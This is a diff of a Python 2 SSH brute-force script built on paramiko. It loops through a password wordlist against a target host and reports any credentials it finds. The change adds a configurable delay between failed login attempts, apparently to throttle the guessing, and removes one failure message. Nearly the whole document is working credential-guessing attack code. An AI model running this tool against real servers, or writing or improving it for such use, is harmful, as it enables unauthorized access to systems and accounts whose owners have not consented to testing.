@@ -1,5 +1,5 @@
 import paramiko, sys, os, socket
-from __main__ import *
+from time import sleep
 
 
 W = '\033[0m'  # white (normal)
@@ -20,7 +20,6 @@ def ssh_connect(address, username, password, port, code=0):
     try:
         ssh.connect(address, port=port, username=username, password=password)
     except paramiko.AuthenticationException:
-        print R + "[!] Error: Authentication Failed! [!]" + W
         code = 1
     except socket.error, e:
         print R + "[!] Error: Connection Failed. [!]"
@@ -31,7 +30,7 @@ def ssh_connect(address, username, password, port, code=0):
 
 
 
-def sshBruteforce(address, username, wordlist, port):
+def sshBruteforce(address, username, wordlist, port, delay):
     wordlist = open(wordlist, 'r')
 
     for i in wordlist.readlines():
@@ -42,6 +41,7 @@ def sshBruteforce(address, username, wordlist, port):
                 print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             elif response == 1:
                 print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+                sleep(delay)
             elif response == 2:
                 print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                 exit()
